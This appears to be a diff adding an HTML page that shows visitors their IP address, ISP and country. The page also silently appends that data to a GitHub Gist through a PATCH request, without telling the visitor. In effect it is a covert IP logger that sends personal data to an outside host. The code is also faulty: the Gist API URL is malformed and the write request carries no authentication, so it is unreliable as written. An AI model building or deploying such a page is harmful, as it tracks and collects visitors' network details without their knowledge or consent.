@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</head>
+<body>
+    IP Address = <span id="ip"></span>
+    <br>
+    ISP = <span id="isp"></span>
+    <br>
+    Country = <span id="country"></span>
+
+    <script>
+        // Declare variables to store data
+        var ipAddress, isp, country;
+
+        // Function to handle the data
+        function handleData(data) {
+            // Assign values to variables
+            ipAddress = data.ip;
+            isp = data.org;
+            country = data.country_name;
+
+            // Update HTML elements with the variables
+            $('#ip').text(ipAddress);
+            $('#isp').text(isp);
+            $('#country').text(country);
+
+            // Send data to GitHub Gist
+            sendToGist(ipAddress, isp, country);
+        }
+
+        // Function to send data to GitHub Gist
+        function sendToGist(ip, isp, country) {
+            // Replace 'your-gist-id' with the actual Gist ID
+            const gistId = '1355d91052d5d03dba93926812a9ab36';
+
+            // Gist API URL
+            const apiUrl = `https://api.github.com/User533859321/${gistId}`;
+
+            // Fetch existing data from the Gist
+            $.getJSON(apiUrl, function(gistData) {
+                // Extract existing data from the Gist
+                const existingData = gistData.files['data.json'].content ? JSON.parse(gistData.files['data.json'].content) : [];
+
+                // New data to be appended
+                const newData = {
+                    ip: ip,
+                    isp: isp,
+                    country: country
+                };
+
+                // Append the new data to the existing data
+                existingData.push(newData);
+
+                // Update Gist with the combined data
+                $.ajax({
+                    url: apiUrl,
+                    type: 'PATCH',
+                    dataType: 'json',
+                    contentType: 'application/json',
+                    data: JSON.stringify({
+                        files: {
+                            'data.json': {
+                                content: JSON.stringify(existingData)
+                            }
+                        }
+                    }),
+                    success: function(response) {
+                        console.log('Data sent to Gist successfully:', response);
+                    },
+                    error: function(error) {
+                        console.error('Error sending data to Gist:', error);
+                    }
+                });
+            });
+        }
+
+        // Fetch data from external API
+        $.getJSON('https://ipapi.co/json', handleData);
+    </script>
+</body>
+</html>
